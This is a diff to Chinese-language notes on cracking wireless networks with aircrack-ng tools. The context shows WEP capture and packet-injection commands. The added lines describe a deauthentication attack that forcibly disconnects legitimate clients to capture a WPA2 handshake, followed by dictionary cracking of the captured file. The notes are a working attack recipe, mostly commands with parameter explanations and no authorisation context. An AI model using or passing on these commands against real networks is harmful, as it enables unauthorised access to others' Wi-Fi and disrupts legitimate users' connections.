@@ -8,6 +8,14 @@ Jul 17 2015
 airodump-ng -c 6 --bssid AP's MAC -w wep mon0
 -c  频道   --bssid 要破解AP的MAC  -w 保存数据包的名字
 
+DeAuth攻击：
+为了获得破解所需的WPA2握手验证的整个完整数据包，将会发送一种称之为“DeAuth”的数据包来将已经连接至无线路由器的合法无线客户端强制断开，此时，客户端就会自动重新连接无线路由器，大家也就有机会捕获到包含WPA2握手验证的完整数据包了
+重新打开一个终端:
+aireplay-ng -0 30 -a A8:57:4E:77:D0:8C mon0
+参数解释：
+-0 采用DeAuth攻击模式，后面跟攻击次数
+-a 待破解的MAC地址
+
 与AP建立虚拟链接：
 aireplay-ng -1 0 -a AP's MAC -h My MAC mon0
 -h 后面跟着自己的无线网卡MAC 
@@ -17,3 +25,5 @@ aireplay-ng -2 -F -p 0841 -c ff:ff:ff:ff:ff:ff -b AP's MAC -h My MAC mon0
 
 airmon-ng stop mon0
 
+跑包：
+aircrack-ng -w dic.txt cap.cap
